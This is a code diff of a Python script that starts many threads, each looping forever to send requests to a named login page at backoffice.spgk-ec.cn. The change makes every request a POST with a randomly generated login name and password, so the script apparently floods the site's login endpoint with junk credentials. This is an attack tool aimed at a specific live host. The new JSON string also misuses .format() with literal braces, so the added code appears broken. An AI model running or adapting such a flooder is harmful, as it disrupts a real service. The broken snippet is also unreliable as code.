@@ -1,5 +1,6 @@
 import requests
 import threading
+import random, string
 
 cookies = {
     'ShangPengGaoKeSelectedLanguage': 'zh-CHS',
@@ -27,7 +28,10 @@ def thread_func(number: int):
     print('This is thread {} running'.format(number))
     while True:
         try:
-            response = requests.get('https://backoffice.spgk-ec.cn/login', headers=headers, cookies=cookies)
+            name = ''.join(random.choices(string.ascii_uppercase + string.digits, k=20))
+            password = ''.join(random.choices(string.ascii_uppercase + string.digits, k=20))
+            data = '{"LoginName":"{}","Password":"{}"}'.format(name, password)
+            response = requests.post('https://backoffice.spgk-ec.cn/login', headers=headers, cookies=cookies, data=data)
             if response.status_code != 200:
                 print('Thread {} got status code {}, Message:\n{}'.format(number, response.status_code, response.text))
         except Exception as e:
